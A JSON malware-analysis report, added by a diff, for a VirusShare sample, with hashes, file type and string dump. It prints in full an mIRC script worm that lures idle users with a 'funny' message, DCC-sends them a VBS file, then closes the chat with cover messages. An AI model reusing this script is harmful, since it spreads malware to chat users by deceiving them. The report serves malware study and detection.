@@ -1,0 +1,37 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "WINDOWS": "May enumerate application windows"
+        },
+        "macro": "[Script]\n\nn0=n1=on *:JOIN:*: {  if ($idle > 480) { | /msg $nick hey man, you have to see this, its funny as hell. |  /dcc send -c $nick C:\\WINDOWS\\pPfKlb.vbs |  /timer $+ $nick 1 60 /close -cfgims $nick |  } | }\nn2=on *:FILESENT:*.txt: {  /timer $+ $nick off | /msg $nick ok, well i have to go now.  later. |   /msg $nick let me know what you think, when i get back. |   /close -cfgims $nick | }\nn3=on *:SENDFAIL:*.txt: {  /timer $+ $nick off | /msg $nick hmmm, sorry, i guess i cant send it. |   /msg $nick well, i have to go.  later. |   /close -cfgims $nick | }"
+    },
+    "filename": "VirusShare_34e4b506208ec59c3ff1cedf8663ae55",
+    "filesize": 570,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "34e4b506208ec59c3ff1cedf8663ae55",
+        "sha1": "ecc88fada176f4888483986b68b4ae7788b52af9",
+        "sha256": "bc07f50b743e0a81ed8418b7b38f88028817a99d3f52324cd4f481c648093cdf"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[Script]",
+            "n0=n1=on *:JOIN:*: {  if ($idle > 480) { | /msg $nick hey man, you have to see this, its funny as hell. |  /dcc send -c $nick C:\\WINDOWS\\pPfKlb.vbs |  /timer $+ $nick 1 60 /close -cfgims $nick |  } | }",
+            "n2=on *:FILESENT:*.txt: {  /timer $+ $nick off | /msg $nick ok, well i have to go now.  later. |   /msg $nick let me know what you think, when i get back. |   /close -cfgims $nick | }",
+            "n3=on *:SENDFAIL:*.txt: {  /timer $+ $nick off | /msg $nick hmmm, sorry, i guess i cant send it. |   /msg $nick well, i have to go.  later. |   /close -cfgims $nick | }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.271378",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
